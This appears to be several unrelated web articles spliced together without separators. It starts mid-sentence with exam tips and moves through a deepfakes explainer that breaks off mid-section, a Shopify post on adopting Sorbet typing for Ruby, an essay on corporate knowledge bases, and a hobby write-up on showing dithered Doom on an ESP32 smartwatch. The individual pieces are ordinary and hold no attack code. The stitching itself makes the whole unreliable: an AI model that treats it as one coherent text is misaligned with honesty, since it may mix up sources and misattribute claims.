</strong>command to your advantage, as this will save you a lot of time.</li><li><strong>Time awareness </strong>– Be aware of the amount of time you spend on each question. Some might require only a couple of minutes, while others require more. Skim through all the questions quickly, make a mental estimate of the time you will have to spend on each of them.</li><li><strong>WiFi – </strong>Ensure that you have seamless internet connectivity to avoid disruptions during your exam.</li><li>Be physically and mentally prepared to sit through the exam for about 2 hours with no break. I know you could take breaks in between, but that will cost you time. So, be prepared.</li></ol>
<p>Ensure that you’re well-rested. Do not stress yourself about the exam as it will only hinder your performance. Even if you do not pass the exam on your first try, you can retake the exam once more. You will have gained insight into the exam expectations, which will surely help you prepare well for your next try. Keep calm and give your best 😊</p>

<h2 id="introduction">Introduction</h2>

<p>Media manipulation through images and videos has been around for decades. For example, during <a href="https://www.dailymail.co.uk/news/article-4984364/How-Hitler-Mussolini-Lenin-used-photo-editing.html">WWII, Mousollini released a propaganda image</a> of himself on a horse with his horse handler edited out. The goal was to make himself seem more impressive and powerful <sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>. These types of tricks can have significant impacts given the scale of the audience, especially in the internet era. <a href="https://www.darpa.mil/program/media-forensics">DARPA has constructed an entire program</a> to develop media forensics methods for detecting manipulated media <sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup>.</p>

Deepfakes are a set of Computer Vision methods that can create doctored images or videos with uncanny realism. In recent years, they have been blowing up in both quality and popularity. The term deepfake comes from a “fake” image or video generated by a “deep” learning algorithm. You’ve likely seen a video of a movie scene with actors face-swapped with a scary degree of accuracy.</p>

</figure>

<p>This technology has the potential to provide malicious actors with the means to sow unprecedented amounts of disinformation because it is far cheaper and more accessible than traditional special effects techniques used in Hollywood when it comes to creating videos with realistic face-swaps. This is concerning, since fake news is already prevalent and people are all too often believing news with little to no evidence <sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup>. Just recently, <a href="https://www.cnn.com/2020/11/01/tech/false-biden-video-twitter/index.html">a deceptively-edited video making it look like Joe Biden didn’t know what state he is in got 1 million views on Twitter</a> <sup id="fnref:5" role="doc-noteref"><a href="#fn:5">5</a></sup>. Deepfakes could provide “evidence” to people who are looking to further their cognitive dissonance around disinformation. This is a real threat, with two bills <a href="https://www.congress.gov/bill/116th-congress/house-bill/3230/text">H. R. 3230</a>,<a href="https://www.congress.gov/bill/115th-congress/senate-bill/3805/text">S. 3805</a> having already been proposed in Congress to counter the spread of deepfakes for illegal purposes.</p>

<p>Since the term was coined in 2017, the amount of detected deepfakes on the internet has been increasing exponentially. At the same time, the underlying AI methods to generate deepfakes have improved, as have user-friendly tools that allow one to easily create deepfakes without in-depth technical knowhow. In this blog post, I’m going to go over some background behind deepfakes, what they have been used for, and how to counter them.</p>

<blockquote>
  <p>A deepfake refers to a specific kind of synthetic media where a person in an image or video is swapped with another person’s likeness. -<a href="https://mitsloan.mit.edu/ideas-made-to-matter/deepfakes-explained">Meredith Somers</a></p>
</blockquote>

<p>Synthetic image and video generation have been a growing computer vision subfields, and they got a lot of momentum with the introduction of generative adversarial networks (GAN) in 2014 <sup id="fnref:8" role="doc-noteref"><a href="#fn:8">6</a></sup>. The term “deepfake” was first coined by a Reddit user in 2017 who was using the technology to create fake pornography of celebrities using face swaps <sup id="fnref:10" role="doc-noteref"><a href="#fn:10">7</a></sup>. Since then, the term has evolved to cover a wider range of image and video augmentations and generation as well as some audio applications.</p>

<p>Deepfakes come in a variety of forms according to <a href="https://arxiv.org/pdf/2004.11138.pdf#page=34&amp;zoom=100,65,305">Mirsky and Lee</a> <sup id="fnref:9" role="doc-noteref"><a href="#fn:9">8</a></sup>. Here are examples of different types of deep fakes on a woman’s face:</p>

<h3 id="reenactment">Reenactment</h3>
<p>aka Using your facial or body movements to dictate the movements of another person</p>

<p>Current works in reenactment are looking to minimize the amount of training data that is needed to be able to generate a modified face. One-shot and few-shot learning have become popular approaches to utilize data from many different faces but only need to fine tune on a select few samples of their target face. Some of the leading methods here are <a href="https://arxiv.org/pdf/1911.08139.pdf">MarioNETte</a> and <a href="https://arxiv.org/pdf/1911.09224.pdf">FLNet</a>.</p>

</figure>

<h3 id="replacement">Replacement</h3>
<p>aka Your identity is mapped to another person (for example the face swap filter on Snapchat)</p>

<p>Many replacement works apply either encoder-decoder networks or variational autoencoders to learn to map the source face to the target while retaining the same expressions. Common challenges that come up with replacement is the need to deal with occlusions, when an object passes in front of the target’s face. Recent replacement models include <a href="https://arxiv.org/abs/1912.13457">FaceShifter</a> and <a href="https://github.com/shaoanlu/faceswap-GAN">FaceSwap-GAN</a>.</p>

</figure>

<p>Reenactment and replacement are the two most prominent types of deepfakes, since they have the highest potential for destructive applications. For example, the face of a politician could be reenacted to say something they never actually said, or a person’s face could be replaced into an incriminating video for blackmail purposes. These types of manipulated media (deepfake or not) can be incriminating and/or harmful to the target’s reputation, like the <a href="https://www.cnn.com/2020/11/01/tech/false-biden-video-twitter/index.html">post of Biden mentioned earlier</a> in which signs that said the name of the state were edited to make it look like he didn’t know where he was.</p>

<p>At the core of the concern about deepfakes is the fact that they make reenactment and replacement accessible and cheap; you don’t have to understand the details of the techniques involved to be able to create deepfakes. Tools like <a href="https://github.com/iperov/DeepFaceLab">DeepFaceLab</a> allow anyone to take an image or video and replace a face, de-age a face, or manipulate a speech. For really seamless deepfakes, tools like this will provide a high quality generation of a face, but you still need some experience in video editing software like Adobe After Effects to add them to a video. If you don’t have the desire or ability to make them yourself, you can even find services and marketplaces willing to create deepfakes for you. One example is <a href="https://deepfakesweb.com/">https://deepfakesweb.com/</a> where you just have to upload videos and images you want, and they will create a deepfake for you in the cloud.</p>

<h2 id="how-are-deepfakes-being-used">How are deepfakes being used?</h2>

</figure>

<p>When deepfakes first gained popularity in 2017, they were overwhelmingly used in internet forums to generate fake pornography of celebrities. Even in 2019, 96% of all publicly posted deepfakes were pornographic, according to a <a href="https://sensity.ai/mapping-the-deepfake-landscape/">survey</a> done by the company <a href="https://sensity.ai/about/">sensity</a>. The targets of deepfakes (the people who have their faces swapped into deepfakes) are generally people who work in the entertainment industry.</p>

</figure>

<h3 id="deepfakes-in-media">Deepfakes in Media</h3>

<p>Aside from pornography, various online creators have been applying deepfakes to other forms of media, namely movie clips; individuals are constantly producing viral videos face swapping actors of movies with other actors. For example, in a recent YouTube video the faces of Arnold Schwarzenegger and Silvester Stalone were added to the movie Step Brothers <sup id="fnref:11" role="doc-noteref"><a href="#fn:11">9</a></sup>.</p>

<figure>

    <figcaption>Deepfake of Arnold Schwarzenegger and Silvester Stallone in the movie Step Brothers <a href="https://www.youtube.com/watch?v=uXwmSFjlVc0">(source)</a></figcaption>
</figure>

<p>While such videos suggest deepfakes could prove to be useful for the entertainment industry, most of these viral videos have just been short demonstrations, and there has yet to be a major Hollywood production to utilize deepfakes. Though, some might say that Hollywood should already be using deepfakes. Netflix received a lot of criticism for the quality of the de-aging effect that was used in the movie “The Irishman”. In response, someone <a href="https://www.creativebloq.com/news/the-irishman-deepfake">applied a de-aging deepfake to the movie and got impressive results</a>; perhaps it’s only a matter of time until Hollywood productions use these tools directly.</p>

<p>While no large blockbusters have used deepfakes, there are some accounts of smaller productions experimenting with deepfakes. Most notably, a producer has used deepfakes in his <a href="https://www.nytimes.com/2020/07/01/movies/deepfakes-documentary-welcome-to-chechnya.html">documentary about gay and lesbian persecution in Chechnya, to disguse the identities of the people being interviewed</a>.</p>

<p>As the examples above demonstrate, besides the possible negative uses of deepfakes, they can also lead to new possibilities when it comes to the entertainment industry. For instance, it could be really cool to be able to select which actor you want to watch in a movie. And, comedy impersonations like on Saturday Night Live will no doubt also reach a whole new level with deepfakes. In fact, just the other week, the creators of South park, Trey Parker and Matt Stone, started a new comedy series on YouTube called “Sassy Justice” centered around using deepfakes for celebrity impersonations. If you’re a fan of South Park you should definitely check it out:</p>

<h3 id="deepfakes-in-politics">Deepfakes in Politics</h3>

<p>Whenever a deepfake video gains attention online, there are always numerous comments from people expressing their concerns about using deepfakes to influence politics for nefarious purposes. These concerns are definitely valid, since in the information age being able to flood the internet with fake media about your political opponents that can fool viewers eyes and ears could be disastrous. To date, there have been quite a few deepfakes made addressing politics, many of which are satirical. One of the most popular was made by Jordan Peele where he reenacted Obama’s face <sup id="fnref:12" role="doc-noteref"><a href="#fn:12">10</a></sup>. This was not done maliciously, but rather to raise awareness of the potential that deepfakes have to shape the political landscape.</p>

  <p><em><strong>Join us November 25, 2020 at 1 pm EST for ShipIt! Presents: The State of Ruby Static Typing at Shopify as we talk about static typing at Shopify. We’ll share why we chose Sorbet for the monolith and the lessons we learned along the way the&nbsp;way. <a href="#ShipIt">Please Register</a>.</strong></em></p>
<p>Shopify changes a lot. We merge around 400 commits to the main branch daily and deploy a new version of our core monolith 40 times a day. The Monolith is also big: 37,000 Ruby files, 622,000 methods, more than 2,000,000 calls. At this scale with a dynamic language, even with the most rigorous review process and over 150,000 automated tests, it’s a challenge to ensure everything&nbsp;runs smoothly. Developers benefit from a short feedback loop to ensure the stability of our monolith for our merchants.</p>
<p>Since 2018, our Ruby Infrastructure team has looked at ways to make the development process safer, faster, and more enjoyable for Ruby developers. While Ruby is different from other languages and brings amazing features allowing Shopify to be what it is today, we felt there was a feature from other languages missing: <strong>static typing</strong>.</p>

<p>Even in 2018, typing for Ruby wasn't a novelty. A few attempts were made to integrate type annotations directly into the language or through external tools (RDL, Steep), or as libraries (dry-types).&nbsp;</p>
<p>Which solution would best fit Shopify considering its codebase and culture? For the Ruby Infrastructure team, the best match for a typing solution needs:</p>
<ul>
<li>
<strong>Gradual typing: </strong>Typing a monolith isn't a simple task and can’t be done in a day. Our code evolves fast, and we can’t ask developers to stop coding while we add types to the existing codebase. We need flexibility to add types without blocking the development process or limiting our ability to satisfy merchants needs.</li>
<li>
<strong>Speed</strong>: Considering the size of Shopify’s codebase, speed is a concern. If our goal is to provide quick feedback on errors and remove pressure from continuous integration (CI), we need a solution that’s fast.</li>
<li>
<strong>Full Ruby support</strong>: We use all of Ruby at Shopify. Our culture embraces the language and benefits from all features, even hard to type ones like metaprogramming, overloading, and class reopening. Support for Rails is also a must. From code elegance to developer happiness, the chosen solution needs to be compatible as much as possible with all Ruby features.</li>
</ul>
<p>With such a list of requirements, none of the contenders at the time could satisfy our needs, especially the speed requirement. We started thinking about developing our own solution, but a perfectly timed meeting with Stripe, who were working on a solution to the problem, introduced us to <a href="https://sorbet.org/" target="_blank" title="Sorbet is a fast, powerful type checker designed for Ruby" rel="nofollow noopener noreferrer">Sorbet</a>.</p>
<p>Sorbet was closed-source at the time and under heavy development but was already promising. It’s built for gradual typing with phenomenal performance (able to analyze 100,000 lines per second per core) making it significantly faster than running automated tests. It can handle hard to type things like metaprogramming, thanks to Ruby Interface files (RBI). This is how, at the start of 2019, Shopify began its journey toward static type checking for Ruby.</p>

<p>With only a three-person team and a lot on our plate, fully typing our monolith with Sorbet was going to be an approach based on Shopify’s <a href="https://vimeo.com/456735890" target="_blank" title="Shopify - How we Get Shit Done" rel="nofollow noopener noreferrer">Get Shit Done (GSD) framework</a>.</p>
<ol>
<li>We tested the viability of Sorbet on our core monolith by only typing a few files, to check if we could observe benefits from it while not impairing other developers’ work. Sorbets’ gradual approach proved to be working.</li>
<li>We manually created RBI files to represent what Sorbet could not understand yet. We checked we supported Ruby’s most advanced features as well as Rails constructs.</li>
<li>We added more and more files while keeping an eye on performance ensuring Sorbet would scale with our monolith.</li>
</ol>
<p>This gave us confidence Sorbet was the right choice to solve our problem. Once we officially decided to go with Sorbet we reflected on how we can reach 100% adoption in the monolith. To determine our roadmap we looked at:</p>
<ul>
<li>how many files needed to be typed</li>
<li>the content of the files</li>
<li>the Ruby features they used.</li>
</ul>

<p>Type checking in Sorbet comes in different levels of strictness. The strictness is defined on a per file basis by adding a magic comment in the file, called a <em>sigil</em>, written <code># typed: LEVEL</code>, where <code>LEVEL</code> can be one of the following:&nbsp;</p>
<ul>
<li>
<strong>ignore</strong>: At this level, the file is not even read by Sorbet, and no errors are reported for this file at all.</li>
<li>
<strong>false</strong>: Only errors related to syntax, constant resolution and correctness of sigs are reported. At this level sorbet doesn’t check the calls in the files even if the methods called don't exist anywhere in the codebase.</li>
<li>
<strong>true</strong>: This is the level where Sorbet actually starts to type check your code. All methods called need to exist in the code base. For each call, Sorbet will check that the arguments count matches the method definition. If the method has a signature, Sorbet will also check their types.</li>
<li>
<strong>strict</strong>: At this level all methods must have a signature, and all constants and instance variables must have explicitly annotated types.</li>
<li>
<strong>strong</strong>: Sorbet no longer allows untyped variables. In practice, this level is actually unusable for most files because Sorbet can’t type everything yet and even Stripe advises against using it.</li>
</ul>
<p>Once we were able to run Sorbet on our codebase, we needed a way to track our progress and identify which parts of our monolith were typed with which strictness or which parts needed more work. To do so we created SorbetMetrics, a tool able to collect and display metrics about typing coverage for all our internal projects. We started tracking three key metrics to measure Sorbet adoption :</p>
<ul>
<li>
<strong>Sigils</strong>: how many files are typed <code>ignore</code>, <code>false</code>, <code>true</code>, <code>strict</code> or <code>strong</code>
</li>
<li>
<strong>Calls</strong>: how many calls are sent to a method with a signature</li>
<li>
<strong>Signatures</strong>: how many methods have a signature</li>
</ul>
<p><img alt="Bar graph showing increased Sorbet usage in projects over time. Below the bar graph is a table showing the percentage of sigils, calls, signatures in each project." data-src="https://cdn.shopify.com/s/files/1/0779/4361/files/sorbet-dashboard_ef9747c0-3326-4b45-bbe9-59a1680718f2.jpg?v=1605798789" src="https://cdn.shopify.com/s/files/1/0779/4361/files/sorbet-dashboard_ef9747c0-3326-4b45-bbe9-59a1680718f2.jpg?v=1605798789"><br><em>SorbetMetrics dashboard homepage</em></p>
<p>Each day SorbetMetrics pulls the latest version of our monolith and other Shopify projects using Sorbet, computes those metrics and displays them in a dashboard internally available to all our developers.</p>

<p>If we treat typing as a product, we also need to focus on supporting and enabling our “customers” who are developers at Shopify. One of our goals was to have a strong support system in place to help with any problems that arise and slow developers down.</p>
<p>Initially, we supported developers with a dedicated Slack channel where Shopifolk could ask questions to the team. We’d answer these questions real-time and help Shopifolk with typing efforts where our input was important.</p>
<p>This white glove support model obviously didn't scale, but it was an excellent learning opportunity for our team—we now understood the biggest challenges and recurring problems. We ended up solving some problems over and over again, but it solidified the effort to understand the patterns and decide which features to work on next.</p>
<p>Using Slack meant our answers weren't discoverable forever. We moved most of the support and conversation to our internal Discourse platform, increasing discoverability and broader sharing of knowledge. This also allows us to record solutions in a single place and let developers self-serve as much as possible. As we onboard more and more projects with Sorbet, this solution scales better.</p>

<p>Going further from unblocking our users, we also need to ensure their happiness. Sorbet and more generally static typing in Ruby wouldn’t be a good fit for us if it made our developers miserable. We’re aware that it introduces a bit more work, so the benefits need to balance with the inconvenience.</p>
<p>Our first tool to measure developers’ opinions of Sorbet is surveys. Twice a year, we send a “Typing @ Shopify” survey to all developers and collect their sentiments regarding Sorbet’s benefits and limitations, as well as what we should focus on in the future.</p>
<p><img alt="A bar graph showing the increasing strongly agree answer over time to the question I want Sorbet to be applied to other Shopify projects. Below that graph is a bar graph showing the increasing strongly agree answer over time to the question I want more code to be typed." data-src="https://cdn.shopify.com/s/files/1/0779/4361/files/Sobert-at-Shopify-Survey-Results-1.jpg?v=1605764198" src="https://cdn.shopify.com/s/files/1/0779/4361/files/Sobert-at-Shopify-Survey-Results-1.jpg?v=1605764198"><br><em>Some responses&nbsp;from our “Sorbet @ Shopify” surveys</em></p>
<p>We use simple questions (“yes” or “no”, or a “Strongly Disagree” (1) to “Strongly Agree” (5) scale) and then look at how the answers evolve over time. The&nbsp;survey results gave us&nbsp;interesting insights:</p>
<ul>
<li>Sorbet catches more errors on developer’s pull requests (PR) as adoption increased</li>
<li>Signatures help with code understanding and give developers confidence to ship</li>
<li>Added&nbsp;confidence&nbsp;directly impacted&nbsp;the increasing positive opinion about static typing in Ruby</li>
<li>Over time developers&nbsp;wanted more code and more projects to be typed</li>
<li>Developers get used to Sorbet syntax over time</li>
<li>IDE integration with Sorbet is a feature developers are rooting for</li>
</ul>
<p>Our main observation is that developers enjoy Sorbet more as the typing coverage increases. This is one reason that's increasing our motivation to reach 100% of files at <code>typed: true</code> and maximize the amount of methods with a signature.</p>
<p>The second tool is interviews with individual developers. We select a team working with Sorbet and meet each member to talk about their experience using Sorbet either in the monolith or on another project. We get a better understanding of what their likes and dislikes are, what we should be improving, but also how we can better support them when introducing Sorbet, so the team keeps Sorbet in their project.</p>

<p>Currently, Sorbet is only enforced on our main monolith and we have about 60 other internal projects that opted to use Sorbet as well. On our main monolith, we require all files to be at least <code>typed: false</code> and Sorbet is run on our continuous integration platform (CI) for every PR and fails builds if type checking errors are found. We’re currently evaluating the idea of enforcing valid type checking on CI even before running the automated tests.</p>

<p>As of today, 80% of our files (including tests) are <code>typed: true</code> or higher. Almost half of our calls are typed and half of our methods have signatures. All of this can be type checked under 15 seconds on our developers machines.</p>

<p>I’ve been thinking a lot about corporate knowledge management systems recently.</p>



<p>If we think about a company as an organism, then a knowledge management system is essentially the (collective) brain that keeps that organism alive and running. A corporate knowledge management system should contain every single bit of codifiable information within the company resulting in a library of all projects, processes and procedures.</p>



<p>In an ideal state, it is the single source of truth that helps to inform every individual in the firm about what everyone else is up to. Information should be easy to add (input) as well as easy to search and find (output) resulting in quick knowledge transfer between different employees.</p>



<p>In reality, however, this hardly ever is the case. As anyone who has ever worked at a larger company can attest to, company knowledge bases always end up being a huge mess. </p>



<p>What starts with a neatly organized Confluence wiki, over time morphs into a multi-headed monster consisting of millions of notes and documents that live across Google Docs, Dropbox Paper, Asana and half a dozen different wiki tools. Most docs will be outdated, some will contradict others and the one you are really looking for only shows up on page 14 of your search results.</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/11/monster-4.png"></p><p>It seems like things usually start to fall apart once a company surpasses the <a href="https://en.wikipedia.org/wiki/Dunbar%27s_number">Dunbar number</a> of 150 employees. This is probably when people start to realize that all the different documents of <em>explicit knowledge</em> they were amassing over the years have been held together with <em>implicit knowledge</em>. </p>



<p>It’s easy to find – and understand – the right documents when you know every other person in the company, but once you’re past that point, you need a system to organize all the data so that people can make sense of it.</p>



<p>The idea behind tools like Notion is to solve this problem by using just one tool for all your different knowledge documents. Instead of Google Docs AND Asana AND Trello AND Airtable, you just do everything in Notion. This reduces complexity because you don’t have to switch and search across different apps. At the same time, Notion forces you to think about a system that makes information easy to find with its folder-like structure and links between different databases.</p>



<p>I’ve never used Notion with more than half a dozen people myself, but from what I’ve heard from people at larger companies, Notion knowledge bases also don’t scale very well beyond a certain number of users. Once too many people start contributing to it, things become bloated and unnavigable.</p>



<p>A friend at Stripe recently suggested – half-jokingly – that we should hire a librarian to organize all our internal data and documentation. The more I think about it, the more I like the idea. Perhaps every company should hire a Chief Notion Officer once it hits 100 employees?!</p>



<p>An alternative approach to Notion is a knowledge management system that can live across different tools and without active manual curation because it’s based on really powerful search. The folder structure of your Google Drive, for example, doesn’t <em>really</em> matter because looking up documents via search is faster and more convenient. Meta search tools like <a href="https://usefyi.com/">FYI</a> are supposed to offer the same but across different productivity tools.</p>



<p>But again I’m skeptical that this really works beyond a certain amount of users (and thus documents). I remember even Google’s internal search engine doing only a mediocre job of surfacing the most relevant documents (and even if it did you weren’t sure if there wasn’t a better or more up-to-date version of it).</p>



<p>I’m sure we’ll get there eventually, but until then we probably need a mix of automated search and manual human help – which is where Slack comes in. I’ve <a href="https://twitter.com/lehrjulian/status/1097940802737704960">always thought</a> Slack plus Notion plus <a href="https://www.atspoke.com/">Spoke</a> would make a really powerful product (and I’m surprised Slack hasn’t made any major acquisitions in this space).</p>



<p>If you think about it, Slack is basically a search engine powered by humans: Most Slack messages are just questions. <a href="https://kwokchain.com/2019/08/16/the-arc-of-collaboration/">It’s 911 for when everything else fails</a>. So if Slack had access to your entire knowledge base, it could answer at least the most commonly asked questions automatically. The rest would still get answered manually by the channel participants. Or your Chief Notion Officer.</p>

  <div itemprop="articleBody">
    

<p>I was trying to find a good use case for my <a href="https://www.banggood.com/LILYGO-TTGO-T-Watch-2020-ESP32-Main-Chip-1_54-Inch-Touch-Display-Programmable-Wearable-Environmental-Interaction-Watch-p-1671427.html">LILIGO TTGO T-Watch</a>. It’s a programmable smart watch featuring the amazing ESP32 chip and a 240x240 color LCD screen.</p>

<p>I keep hearing about Doom running on this and that, sometimes directly and sometimes using the device as an exotic external screen. My project falls into the latter category, but it was a lot of fun to implement!</p>

<blockquote>
  <p>As this was mostly a learning experience, I took several wrong turns and mention them in this writeup.</p>
</blockquote>

<p>As with most of tiny projects, I got the basics version up and running on a two afternoons and then fiddled with the code for a few more days to get a more presentable result.</p>

<p><img src="http://jborza.com/assets/doom-watch-500.jpg" alt="alt"></p>

<p><em>It works!</em></p>

<h2 id="building-steps">Building steps</h2>

<h3 id="getting-the-video-signal-across">Getting the video signal across</h3>

<p>There are a couple of ways to transmit data from a computer to the ESP32-based watch. Wi-Fi, Bluetooth and a serial port.</p>

<p>Serial port seemed promising - I initially targeted 120x120 picture, which can be represented by 14400 bits or 1800 bytes. Targeting 115200 bauds I could achieve around 7 fps (115200 / 16200 bauds per frame).</p>

<blockquote>
  <p>The default serial configuration is 8 data bits, no parity and one stop bit, hence 9 bauds per byte.</p>
</blockquote>

<p>With the goal was of displaying DOOM on the smart watch in mind, I thought. I decided to divide this into three phases:</p>
<ul>
  <li>Scale the image down to the resolution of the watch</li>
  <li>Implement a proof of concept serial display on the T-Watch</li>
  <li>Optimize until it works better</li>
</ul>

<h2 id="scaling-doom">Scaling Doom</h2>

<p>I started with finding a suitable Doom source port. I discovered  <a href="https://www.chocolate-doom.org/">Chocolate Doom</a>, which accurately reproduces the game as it was played in the 1990s.</p>

<p>Building it on Ubuntu is straightforward, so I dived straight into the code and started poking around.</p>

<h3 id="wrong-turn-1---modifying-doom-internal-resolution">Wrong turn #1 - modifying Doom internal resolution</h3>

<p>The first thing I did was try to find how a resolution gets set.</p>

<p>At first I tried to change the internal resolution of the renderer - there was a <code>#define</code>
for <code>SCREEN_WIDTH 320</code> and <code>SCREEN_HEIGHT 200</code> in <code>i_video.h</code>.</p>

<p>Changing this to 120x75 made the game crash. I attached a debugger to see where exactly and the game was attempting to render some things at locations beyond 120x75. Scaling all coordinates by 0.5x helped get the menu to display, but it crashed again as soon as I started the game.</p>

<h3 id="scaling-and-dithering">Scaling and dithering</h3>

<p>After studying the Chocolate Doom source port some more I realized it has a series of buffers and textures that represent stages of the <a href="https://github.com/chocolate-doom/chocolate-doom/blob/master/src/i_video.c#L780">rendering pipeline</a>.</p>

<blockquote>
  <p>The engine itself draws assets with a <a href="https://zdoom.org/wiki/Palette">palette</a> to make a better use of 255 colors.</p>
</blockquote>

<ul>
  <li>the game is drawn into an 8-bit paletted 320x200 paletted screen buffer.</li>
  <li>blit into a 32-bit ARGB 320x200 buffer</li>
  <li>rendered into an upscaled texture using a nearest linear scaling (e.g. 640x400)</li>
  <li>rendered to the screen (e.g. 800x600) using linear scaling</li>
</ul>

<p>It was clear the dithering and output to the serial port should happen somewhere within this pipeline.</p>

<h3 id="wrong-turn-2">Wrong turn #2</h3>

<p>I realized looking at the screenshots from various buffers that I’ve been dithering the wrong display buffer (the 320x200 display buffer), then downscaled in SDL to 240x150, which caused artifacts and didn’t look as good.</p>

<p>The correct way was to scale the display buffer to 240x150, then dither, then send this over the wire.</p>

<h2 id="dithering">Dithering</h2>

<p>After a little research on 1-bit graphics I realized there are two commonly used dithering algorithms - I implemented both:</p>

<h3 id="ordered-dithering">Ordered dithering</h3>

<p><a href="https://en.wikipedia.org/wiki/Ordered_dithering">Ordered dithering</a> is a simple algorithm that produces a characteristic crosshatch pattern.</p>

<p>It works by applying a threshold map to the pixels displayed, causing pixels from the map to change color based on the distance from the original color to black and white.</p>

<p><img src="http://jborza.com/assets/doom-ordered-4x4-matrix.png" alt="ordered dithering"></p>

<p><em>Ordered dithering patterns</em></p>

<h3 id="floyd-steinberg-dithering">Floyd-Steinberg dithering</h3>

<p><a href="https://en.wikipedia.org/wiki/Floyd%E2%80%93Steinberg_dithering">Floyd-Steinberg dithering</a> operates using error diffusion and is characterized by its grainy or speckled appearance.</p>

<p>Because Floyd-Steinberg works by pushing the quantization error from a pixel to its neighboring pixels, a slight change in the scene can propagate over the entire screen. I found that aesthetically less pleasing than the more predictable ordered dithering, as it was simply less jumpy.</p>

<p><img src="http://jborza.com/assets/doom-dither-240x150.png" alt="doom dithered"></p>

<p><em>Floyd-Steinberg dithering above, ordered dithering below</em></p>

<h3 id="grayscale-and-gamma">Grayscale and gamma</h3>

<p>In both dithering algorithms we convert the color to grayscale with the following algorithm:</p>

<div><div><pre><code><span>//get r,g,b color values</span>
<span>uint8_t</span> <span>r</span><span>,</span> <span>g</span><span>,</span> <span>b</span><span>;</span>
<span>uint32_t</span> <span>pix</span> <span>=</span> <span>getpixel</span><span>(</span><span>s</span><span>,</span> <span>x</span><span>,</span> <span>y</span><span>);</span>
<span>SDL_GetRGB</span><span>(</span><span>pix</span><span>,</span> <span>s</span><span>-&gt;</span><span>format</span><span>,</span> <span>&amp;</span><span>r</span><span>,</span> <span>&amp;</span><span>g</span><span>,</span> <span>&amp;</span><span>b</span><span>);</span>
      
<span>// Convert the pixel value to grayscale / intensity</span>
<span>grayscale</span> <span>=</span> <span>.</span><span>299</span><span>f</span> <span>*</span> <span>r</span> <span>+</span> <span>.</span><span>587</span><span>f</span> <span>*</span> <span>g</span> <span>+</span> <span>.</span><span>114</span><span>f</span> <span>*</span> <span>b</span><span>;</span>
</code></pre></div></div>

<p>Doom is quite dark, so it’s hard to see anything in the default <em>gamma</em> setting. Fortunately the engine also features gamma correction, that can be toggled with the <code>F11</code> key in game.</p>

<p><img src="http://jborza.com/assets/doom-gamma.png" alt="gamma"></p>

<p><em>Gamma settings 1, 3, 5 going from unusable in monochrome to pretty bright</em></p>

<h2 id="watch-as-an-external-display">Watch as an external display</h2>

<p>To make data transfer a bit less intensive I decided to transmit in 120x120 resolution and then double the pixels to 240x240 on the device.</p>

<p>Initially I programmed my watch to be a simple single-core serial display.
It reads one row of pixels from the serial port as 120 bits that represent black or white pixels, then expands each bit onto a 16-bit array value.</p>

<h4 id="transfer-rate">Transfer rate</h4>
<p>When transmitting 120x120 pixels at around 16 FPS we produce around 15 * 9 (data + stop bit) * 120 (rows) * 16 (fps) = 259 kbits of data per second.</p>

<p>The algorihm for</p>
<div><div><pre><code><span>char</span> <span>rxBuffer</span><span>[</span><span>RECEIVE_LINE_BYTES</span><span>];</span>
<span>uint32_t</span> <span>lineBuffer</span><span>[</span><span>DISPLAY_LINE_LENGTH</span><span>];</span>
<span>...</span>
<span>Serial</span><span>.</span><span>readBytes</span><span>(</span><span>rxBuffer</span><span>,</span> <span>RECEIVE_LINE_BYTES</span><span>);</span>
<span>tft</span><span>-&gt;</span><span>setAddrWindow</span><span>(</span><span>0</span><span>,</span> <span>y</span><span>,</span> <span>DISPLAY_LINE_LENGTH</span><span>,</span> <span>2</span><span>);</span>
<span>convertPixelsBetweenBuffers</span><span>();</span>
<span>tft</span><span>-&gt;</span><span>startWrite</span><span>();</span>
<span>tft</span><span>-&gt;</span><span>pushPixels</span><span>(</span><span>lineBuffer</span><span>,</span> <span>DISPLAY_LINE_LENGTH</span><span>);</span>
<span>tft</span><span>-&gt;</span><span>pushPixels</span><span>(</span><span>lineBuffer</span><span>,</span> <span>DISPLAY_LINE_LENGTH</span><span>);</span>
<span>tft</span><span>-&gt;</span><span>endWrite</span><span>();</span>
</code></pre></div></div>

<p>The pixel conversion does the horizontal pixel doubling and prepares it to the  converts input (a 120 bits field) to the display line (240 16-bit pixels, stored in a 120 32-bit array). It iterates bit by bit .
We can display data on the TTGO T-Watch using the <a href="https://github.com/Bodmer/TFT_eSPI">TFT_eSPI library</a>. It includes a <code>pushPixels</code> function that expects a buffer of 16-bit pixel colors.</p>

<p>I wrote a <a href="https://github.com/jborza/watch-doom-receiver/blob/master/util/sender.py">supporting tool</a> to feed the watch some pixels in Python. The bits are sent using the <code>pyserial</code> library in a loop.</p>

<h2 id="connecting-the-watch-and-doom">Connecting the Watch and Doom</h2>

<p>Python is not very helpful in the Chocolate Doom port, so I had to write the serial frame transmitter in C. 
I’ve adapted the <a href="https://stackoverflow.com/a/38318768/72746">first code snippet I found</a> I found on Stack Overflow, credit goes to <a href="https://stackoverflow.com/users/1599004/sawdust">sawdust</a>.</p>

<p>Still working in the 120x120 pixel resolution, this is how the intermediate result looked:</p>

<p><img src="http://jborza.com/assets/doom-120x120-watch.jpg" alt="first attempt"></p>

<blockquote>
  <p>It’s incredibly low-res. Also, because I was lazy, the last row of pixels of the status bar is leaking all the way down the screen as I just repeated rows 75 up to 120 in the output stream :-)</p>
</blockquote>

<p>I eventually bumped the resolution to 240x150.</p>

<p>There’s nothing special about the serial output module, there’s a function that takes an <code>SDL_Surface</code> assuming its dimensions being 240x150, loops over the RGB values and for every row of 240 pixels (bits) spits out 30 bytes.</p>

</code></pre></div></div>

<h2 id="getting-it-faster">Getting it faster</h2>

<p>Straightforward increase of the baudrate to 500,000 caused some screen tearing, it seemed that the <em>serial receiver</em> code on the watch was having hard time keeping up. After optimizing the bit conversion loop it could handle stable 500,000 bauds, leading to high enough framerate to consider increasing the resolution to 240x240.</p>

<h3 id="wrong-turn-3---going-multi-core-on-the-esp32">Wrong turn #3 - going multi-core on the ESP32</h3>

<p>I thought I could leverage the second core on the ESP32 and have the watch run two tasks - one that processes the serial data and another that decodes it and sends to the display.</p>

<p>I implemented a proof of concept serial display that uses the <a href="https://www.freertos.org/RTOS-task-notifications.html">FreeRTOS Task notification API</a> to communicate between the task using notifications.</p>

<p>It used two buffers - one to receive the serial data which got copied to the display task and the notifications were supposed to let the tasks know that they can touch the shared buffer.</p>

